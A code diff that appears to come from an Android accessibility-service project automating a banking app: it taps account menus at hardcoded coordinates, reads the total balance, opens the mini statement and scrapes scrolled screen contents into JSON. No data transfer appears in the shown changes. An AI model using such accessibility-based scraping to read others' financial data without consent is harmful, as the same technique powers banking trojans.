@@ -182,10 +182,16 @@ public class MyAccessibilityService extends AccessibilityService {
 
     private void transactionAccount() {
         checkForSessionExpiry();
+
         if (isTransactionAccount) {
             return;
         }
         ticker.setNotIdle();
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
         AccessibilityNodeInfo transactionAccount = AccessibilityMethod.findNodeByText(AccessibilityMethod.getTopMostParentNode(getRootInActiveWindow()), "(SB/CA/OD Accounts)", true, false);
         if (transactionAccount != null) {
             Rect outBounds = new Rect();
@@ -194,24 +200,31 @@ public class MyAccessibilityService extends AccessibilityService {
             if (isClicked) {
                 transactionAccount.recycle();
                 isTransactionAccount = true;
+                isTransactionAccountDetails = true;
                 isAccountSummary = true;
             }
+        }
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
         }
     }
 
     private void transactionAccountDetails() {
         checkForSessionExpiry();
-        ticker.setNotIdle();
-        if (isTransactionAccount) {
+        if (isTransactionAccountDetails) {
             try {
-                Thread.sleep(5000);
+                Thread.sleep(2000);
             } catch (InterruptedException e) {
                 throw new RuntimeException(e);
             }
+            ticker.setNotIdle();
             boolean isClicked = performTap(317, 389, 1100);
             if (isClicked) {
-                System.out.println("transactionAccountDetails" + isTransactionAccountDetails);
-                isTransactionAccount = false;
+                System.out.println("transactionAccountDetails " + isTransactionAccountDetails);
+              //  isTransactionAccount = false;
+                isTransactionAccountDetails = true;
             }
         }
     }
@@ -241,6 +254,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 accountInformation.recycle();
                 isGetBalance = true;
                 isStatement = false;
+                isTransactionAccountDetails = false;
                 scrollCounter = 0;
 
             }
@@ -259,7 +273,7 @@ public class MyAccessibilityService extends AccessibilityService {
         if (Config.totalBalance.isEmpty()) {
             isGetBalance = false;
         } else {
-            Log.d("Total Balance", "Total Balance=>" + Config.totalBalance);
+            Log.d("Total Balance", "Total Balance=> " + Config.totalBalance);
             AccessibilityNodeInfo miniStatement = AccessibilityMethod.findNodeByText(AccessibilityMethod.getTopMostParentNode(getRootInActiveWindow()), "Mini Statement", true, false);
             if (!isStatement) {
                 if (miniStatement != null) {
@@ -276,20 +290,22 @@ public class MyAccessibilityService extends AccessibilityService {
             } catch (InterruptedException e) {
                 throw new RuntimeException(e);
             }
+
+
             AccessibilityNodeInfo scrollRecyclerView = AccessibilityMethod.findAndScrollListView(AccessibilityMethod.getTopMostParentNode(getRootInActiveWindow()), "androidx.recyclerview.widget.RecyclerView");
             if (scrollRecyclerView != null) {
-                while (scrollCounter < 1) {
-                    scrollRecyclerView.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+                while (scrollCounter < 3) {
                     DataFilter.convertToJson(AccessibilityMethod.getTopMostParentNode(getRootInActiveWindow()));
+                    scrollRecyclerView.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                     try {
-                        Thread.sleep(1000);
+                        Thread.sleep(3000);
                     } catch (InterruptedException e) {
                         throw new RuntimeException(e);
                     }
                     scrollCounter++;
-                    if (scrollCounter == 1) {
+                    if (scrollCounter == 3) {
                         boolean menuClick = performTap(668, 122, 150);
-                        System.out.println("menuClick" + menuClick);
+                        System.out.println("menuClick " + menuClick);
                         try {
                             Thread.sleep(1000);
                         } catch (InterruptedException e) {
@@ -336,9 +352,26 @@ public class MyAccessibilityService extends AccessibilityService {
             transactionAccount.getBoundsInScreen(outBounds2);
             boolean isTransactionAccount2 = performTap(outBounds2.centerX(), outBounds2.centerY());
             if (isTransactionAccount2) {
-                isTransactionAccount = false;
-                Config.totalBalance = "";
-                scrollCounter = 0;
+                isTransactionAccount = true;
+                isTransactionAccountDetails = true;
+                isMyAccount = true;
+                isDrawerMyAccount = false;
+                try {
+                    Thread.sleep(2000);
+                } catch (InterruptedException e) {
+                    throw new RuntimeException(e);
+                }
+                boolean isClicked = performTap(317, 389, 1100);
+                if(isClicked)
+                {
+                    Config.totalBalance = "";
+                    scrollCounter = 0;
+                }
+                try {
+                    Thread.sleep(1000);
+                } catch (InterruptedException e) {
+                    throw new RuntimeException(e);
+                }
             }
         }
     }
@@ -443,7 +476,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 }
             }
             try {
-                Thread.sleep(5000);
+                Thread.sleep(2000);
             } catch (InterruptedException e) {
                 throw new RuntimeException(e);
             }
